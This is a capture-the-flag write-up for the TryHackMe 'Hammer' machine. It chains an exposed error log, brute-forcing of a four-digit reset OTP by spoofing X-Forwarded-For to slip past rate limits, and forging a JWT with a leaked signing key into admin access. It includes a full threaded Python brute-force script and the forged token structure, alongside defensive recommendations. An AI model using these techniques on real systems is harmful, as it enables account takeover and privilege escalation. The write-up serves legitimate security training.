# TryHackMe | Hammer

**Difficulty:** Medium  
**OS:** Linux  
**Category:** Web / Authentication / JWT

## Overview

Hammer is a TryHackMe challenge that demonstrates how information disclosure, weaknesses in password recovery, and JWT key exposure can be chained into privilege escalation.

The main attack path was:

```text
Web Enumeration
      ↓
Developer Comment
      ↓
Directory Fuzzing
      ↓
Exposed Error Log
      ↓
Account Discovery
      ↓
OTP Brute Force / Rate-Limit Weakness
      ↓
Password Reset and Dashboard Access
      ↓
Exposed JWT Signing Key
      ↓
JWT Forgery
      ↓
Privilege Escalation
```

The main lesson was to treat each discovery as a lead for the next step, then validate the actual behavior rather than assuming that a suspicious feature is automatically vulnerable.

> **Lab scope:** This write-up describes the TryHackMe Hammer machine. Replace `<TARGET_IP>` with the IP assigned to the current instance.

---

## 1. Reconnaissance

A full TCP port scan identified SSH and a web application running on port `1337`.

```bash
nmap -p- <TARGET_IP>
```

The web application was available at:

```text
http://<TARGET_IP>:1337/
```

The initial page exposed a login form and a password-recovery feature. Initial SQL injection tests against the login request did not produce a useful signal, so I continued with source inspection and content discovery instead of assuming that the login form was the only attack surface.

## 2. Directory Enumeration

The login page contained this developer comment:

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

The comment revealed a naming convention, making it possible to fuzz the suffix while keeping the `hmr_` prefix fixed.

```bash
ffuf \
  -u http://<TARGET_IP>:1337/hmr_FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fc 404
```

The useful paths included:

```text
/hmr_images
/hmr_css
/hmr_js
/hmr_logs
```

These paths returned redirects, so I followed up on the discovered directories rather than treating the status code alone as a vulnerability.

## 3. Information Disclosure Through Error Logs

The log file was accessible at:

```text
http://<TARGET_IP>:1337/hmr_logs/error.logs
```

The log contained authentication-related entries, including a reference to:

```text
tester@hammer.thm
```

It also exposed internal filesystem paths and authentication errors. The email address was a useful lead because it could be tested against the application's password-recovery flow.

### Finding

**Sensitive information disclosure through publicly accessible diagnostic logs.**

Logs should not be stored beneath a publicly served web directory. Directory naming conventions and obscurity are not security controls.

## 4. Password Recovery and OTP Analysis

Submitting `tester@hammer.thm` to the password-recovery form led to a four-digit recovery-code page with a countdown of approximately 180 seconds.

A captured request looked like this (the session identifier is redacted):

```http
POST /reset_password.php HTTP/1.1
Host: <TARGET_IP>:1337
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<REDACTED>

recovery_code=1234&s=164
```

The response included a `Rate-Limit-Pending` header. Comparing requests showed that added `X-Forwarded-For` affected the reported remaining-attempt counter. This suggested that the application was using a client-controllable header when tracking attempts.

### Why this mattered

A four-digit OTP has 10,000 possible values, from `0000` through `9999`. Its short lifetime limits the attack window, but the more important weakness was the ability to influence rate-limit tracking using a request header that clients can supply.

`X-Forwarded-For` is commonly added by a trusted reverse proxy. An application should not blindly trust arbitrary values supplied by clients. If an untrusted value is used as the identity for rate limiting, attempts may be split across multiple apparent sources.

In this lab, a Python script automated OTP requests, retained the recovery session, varied the supplied header value, and inspected the response to identify the transition to the new-password form. The code is included in the appendix below.

> **Validation note:** HTTP `200 OK` alone does not mean an OTP is valid. The successful response was identified by the page changing from the recovery-code form to the new-password form. The response marker should be revalidated if the application changes.

After validating the recovery flow, I reset the account password, logged in, and reached the dashboard. The first flag was:

```text
THM{XXXXXXXX}
```

### Defensive recommendations

- Use a sufficiently large, cryptographically random OTP space.
- Apply server-side rate limiting to the account and recovery transaction, with a source identity derived from trusted infrastructure.
- Only honor forwarded-IP headers from explicitly trusted proxies that overwrite incoming values.
- Keep OTP expiry and reset state server-side; do not rely on a browser countdown value.
- Make recovery codes single-use and invalidate them after successful use or a new recovery request.
- Monitor and throttle repeated verification failures.

## 5. OTP Automation with Python

The following lab script demonstrates the automation approach used during the exercise. It is configured for a private target IP, retains the PHP session created during recovery, sends four-digit candidates, and stops when the response contains the new-password page heading.

**Use this only against the authorized TryHackMe instance.** Update `TARGET_IP` when the machine IP changes. The script does not automatically submit a new password.

```python
#!/usr/bin/env python3

import ipaddress
import random
import threading
import time
from urllib.parse import urlparse

import requests

TARGET_IP = "10.49.170.54"  # Replace with the current Hammer IP
TARGET = f"http://{TARGET_IP}:1337/reset_password.php"
EMAIL = "tester@hammer.thm"

THREADS = 10
TIMEOUT = 5
RECOVERY_SECONDS = 180

# The successful response in this room changes to this heading.
SUCCESS_MARKER = "reset your password"

stop_event = threading.Event()
print_lock = threading.Lock()
attempt_lock = threading.Lock()
attempt_count = 0


def validate_target():
    """Keep this lab helper restricted to a private IP address."""
    parsed = urlparse(TARGET)
    try:
        address = ipaddress.ip_address(parsed.hostname)
    except ValueError as exc:
        raise ValueError("TARGET must use a private IP address") from exc

    if not address.is_private:
        raise ValueError("Refusing to run against a non-private target")


def random_forwarded_ip():
    """Use a documentation-only IP range for the lab header test."""
    return f"198.51.100.{random.randint(1, 254)}"


def initialize_recovery():
    """Start the recovery flow and retain its PHP session cookie."""
    session = requests.Session()
    response = session.post(
        TARGET,
        data={"email": EMAIL},
        timeout=TIMEOUT,
    )
    response.raise_for_status()

    phpsessid = session.cookies.get("PHPSESSID")
    if not phpsessid:
        raise RuntimeError(
            "PHPSESSID was not returned; check the recovery flow and response"
        )

    print(f"[+] Recovery flow initialized: HTTP {response.status_code}")
    print("[+] PHP session acquired")
    return phpsessid


def test_candidate(code, phpsessid):
    """Send one candidate OTP and inspect the response body."""
    global attempt_count

    response = requests.post(
        TARGET,
        headers={
            "Cookie": f"PHPSESSID={phpsessid}",
            "X-Forwarded-For": random_forwarded_ip(),
            "Content-Type": "application/x-www-form-urlencoded",
        },
        data={
            "recovery_code": f"{code:04d}",
            "s": str(RECOVERY_SECONDS),
        },
        timeout=TIMEOUT,
        allow_redirects=False,
    )

    with attempt_lock:
        attempt_count += 1
        current_attempt = attempt_count

    body = response.text.lower()
    if response.status_code in (200, 302) and SUCCESS_MARKER in body:
        with print_lock:
            if not stop_event.is_set():
                stop_event.set()
                print(f"\n[+] Candidate OTP: {code:04d}")
                print(f"[+] HTTP status: {response.status_code}")
                print(f"[+] Response length: {len(response.text)}")
                print("[+] Verify the new-password form before proceeding.")
        return True

    if current_attempt % 100 == 0:
        with print_lock:
            print(f"[*] Requests sent: {current_attempt}")

    return False


def worker(worker_id, phpsessid, deadline):
    """Test a portion of the four-digit candidate space."""
    for code in range(worker_id, 10_000, THREADS):
        if stop_event.is_set() or time.monotonic() >= deadline:
            return

        try:
            if test_candidate(code, phpsessid):
                return
        except requests.RequestException as exc:
            with print_lock:
                print(f"[!] Request failed for candidate {code:04d}: {exc}")


def main():
    global attempt_count

    validate_target()
    print(f"[*] Target: {TARGET}")
    print(f"[*] Account: {EMAIL}")

    try:
        phpsessid = initialize_recovery()
    except (requests.RequestException, RuntimeError) as exc:
        print(f"[!] Could not initialize recovery: {exc}")
        return

    started = time.monotonic()
    deadline = started + RECOVERY_SECONDS - 5
    print(f"[*] Worker count: {THREADS}")
    print("[*] Starting OTP-response analysis")

    workers = []
    for worker_id in range(THREADS):
        thread = threading.Thread(
            target=worker,
            args=(worker_id, phpsessid, deadline),
            daemon=True,
        )
        workers.append(thread)
        thread.start()

    for thread in workers:
        thread.join()

    elapsed = time.monotonic() - started
    print(f"\n[*] Requests sent: {attempt_count}")
    print(f"[*] Elapsed: {elapsed:.1f} seconds")

    if not stop_event.is_set():
        print("[-] No successful response marker detected.")
        print("[-] Recheck the response marker, session, and recovery timer.")


if __name__ == "__main__":
    main()
```

Run it from the AttackBox after updating the target IP:

```bash
python3 -m pip install requests
python3 pin.py
```

The script uses a response marker rather than treating any `200 OK` response as success. It is still challenge-specific: changes to the application, OTP workflow, countdown handling, or rate-limit implementation may require changes to the script.

## 6. Dashboard Reconnaissance

After resetting the password and logging in, I inspected the dashboard and found a command input. The `ls` command returned a file listing, while `pwd` and `ls -la` were rejected. This indicated that the feature had some command restrictions; the ability to run `ls` alone was not proof of command injection.

The listing included:

```text
188ade1.key
composer.json
config.php
dashboard.php
execute_command.php
hmr_css/
hmr_images/
hmr_js/
hmr_logs/
index.php
logout.php
reset_password.php
vendor/
```

The filename `188ade1.key` stood out because the dashboard JWT header contained a `kid` value resembling a filesystem path.

## 7. JWT Inspection and Signing-Key Disclosure

The dashboard used a JWT with `HS256`. Its header looked similar to:

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

The decoded payload had standard claims and a nested `data` object containing the current user's email and role:

```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1791959513,
  "exp": 1791963113,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

The file `188ade1.key` was accessible directly through the web server:

```text
http://<TARGET_IP>:1337/188ade1.key
```

This exposed key material that should not have been publicly downloadable. The actual secret value is intentionally omitted from this public write-up.

JWT contents are encoded, not encrypted. With HS256, the signer and verifier use the same secret to calculate and validate the signature. Anyone who obtains that secret may be able to create tokens with altered claims, provided the application accepts the resulting token and its claims.

## 8. JWT Forgery and Privilege Escalation

After retrieving the exposed key, I tested whether the application would accept a newly signed token with an elevated role. The `kid` was changed to reference the exposed file path, and the nested role claim was changed from `user` to `admin`.

**Illustrative header:**

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}
```

**Illustrative payload:**

```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": "<CURRENT_UNIX_TIMESTAMP>",
  "exp": "<FUTURE_UNIX_TIMESTAMP>",
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
```

The token must be signed again with the HS256 secret after changing the header or payload. Merely editing the JSON changes the signing input and causes signature verification to fail.

The command endpoint accepted a bearer token in the `Authorization` header. The browser request also contained a `token` cookie, so both token locations were updated to the newly signed JWT while preserving the PHP session cookie. An initial request returned `Invalid token: Signature verification failed` because the signing secret had not yet been supplied to the JWT editor. After using the key and generating a new signature, the privilege-escalation chain succeeded.

### Root cause

The impact came from the combination of:

1. **Signing-key disclosure:** key material was placed in a publicly accessible web directory.
2. **Unsafe key selection:** the `kid` value was used as a file-path-like key reference rather than a server-controlled, allowlisted key identifier.
3. **Authorization based on a forged token:** once a token with a valid signature and an elevated role was accepted, the server trusted the manipulated privilege claim.

A `kid` value resembling a path is not automatically vulnerable by itself. The issue was the unsafe implementation combined with exposed key material and the ability to create a token the application accepted.

### Defensive recommendations

- Store signing keys outside the web root and restrict filesystem permissions.
- Rotate any signing key that has been exposed.
- Treat `kid` as an identifier, not an arbitrary filesystem path; map it to an allowlisted key on the server.
- Enforce an explicit algorithm allowlist server-side.
- Validate issuer, audience, expiry, and all required claims.
- Avoid relying exclusively on mutable JWT role claims for authorization; derive permissions from trusted server-side state where appropriate.
- Remove sensitive files, logs, configuration, and key material from public web paths.

## 9. Vulnerabilities and Weaknesses

### Publicly Accessible Diagnostic Logs

The web server exposed an error log containing internal paths and an account identifier.

**Impact:** Information disclosure that helped identify an account and continue testing the password-recovery flow.

### Weak OTP Rate-Limit Enforcement

The recovery flow used a four-digit OTP and relied on a client-controllable `X-Forwarded-For` value when tracking attempts.

**Impact:** The rate-limit control could be weakened, making automated OTP guessing practical within the recovery window in this lab.

### JWT Signing-Key Disclosure

The HS256 signing key was accessible through the web root.

**Impact:** Exposure of the signing secret allowed JWT forgery when the application accepted tokens signed with that key and trusted the altered role claim.

### Unsafe JWT Key Selection and Trust in Role Claims

The `kid` value resembled a filesystem path, and the application accepted the forged token with an elevated role.

**Impact:** Privilege escalation from a normal user to an administrative role.

## 10. Complete Attack Chain

```text
Nmap
  ↓
Port 1337 web application
  ↓
Developer comment reveals hmr_ naming convention
  ↓
Fuzzing discovers hmr_logs
  ↓
Exposed error log reveals tester@hammer.thm
  ↓
Password-recovery flow exposes four-digit OTP
  ↓
X-Forwarded-For manipulation weakens rate-limit tracking
  ↓
OTP verification succeeds and password is reset
  ↓
Dashboard reveals JWT and command feature
  ↓
File listing reveals 188ade1.key
  ↓
Signing key is downloaded over HTTP
  ↓
JWT is re-signed with role=admin
  ↓
Privilege escalation succeeds
```

## 11. Key Takeaways

The most valuable lesson from Hammer was not a single payload or tool. It was learning to turn observations into testable hypotheses and connect individual findings into an attack path.

```text
Clue
  ↓
What does it reveal?
  ↓
Which security boundary might be affected?
  ↓
How can I validate the hypothesis?
  ↓
What additional access does the result provide?
  ↓
Can it be chained into a larger impact?
```

Hammer was a useful exercise in moving from **individual vulnerability discovery toward attack-chain reasoning**, while also identifying a practical skill gap in HTTP automation and learning to address it with Python.
